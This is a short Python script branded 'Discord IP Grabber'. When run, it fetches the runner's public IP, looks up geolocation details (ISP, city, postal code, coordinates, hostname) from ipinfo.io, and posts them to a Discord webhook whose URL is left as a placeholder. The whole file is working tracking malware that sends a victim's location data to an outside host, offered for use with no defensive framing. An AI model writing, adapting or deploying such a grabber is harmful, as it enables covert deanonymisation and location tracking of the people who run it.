import requests
import colorama
import asyncio
import time
import json
import threading
import os
import ctypes
from colorama import Fore, Style
from threading import Thread
from sys import stdout
from requests import Session
from time import strftime, gmtime
from discord_webhook import DiscordWebhook
sent = 0
session = Session()
b = Style.BRIGHT
os = os.system
os('cls')



print(f"""

{b+Fore.GREEN}


██████╗ ███████╗██╗   ██╗██╗ ██████╗███████╗██████╗ 
██╔══██╗██╔════╝██║   ██║██║██╔════╝██╔════╝██╔══██╗
██████╔╝█████╗  ██║   ██║██║██║     █████╗  ██║  ██║
██╔══██╗██╔══╝  ╚██╗ ██╔╝██║██║     ██╔══╝  ██║  ██║
██║  ██║███████╗ ╚████╔╝ ██║╚██████╗███████╗██████╔╝
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚═╝ ╚═════╝╚══════╝╚═════╝ 

                                                             
{b+Fore.BLUE} > {Fore.RESET}Discord IP Grabber
{b+Fore.BLUE} > {Fore.RESET}Creator: isaiah#6969
""")

webhook = "webhook-link"
rg = requests.get("http://api.ipify.org/").text
msg_rg = "IP found : "+rg
ipinfo = requests.get("http://ipinfo.io/%s/json" % (rg)).json()
info = f'''
IP : {ipinfo['ip']}
ISP : {ipinfo['org']}
City : {ipinfo['city']}
State : {ipinfo['region']}
Country : {ipinfo['country']}
Timezone : {ipinfo['timezone']}
Postal : {ipinfo['postal']}
Hostname : {ipinfo['hostname']}
Coordinates : {ipinfo['loc']}
Api Info : {ipinfo['readme']}

'''

webhook = DiscordWebhook(url=webhook, content=info)
response = webhook.execute()
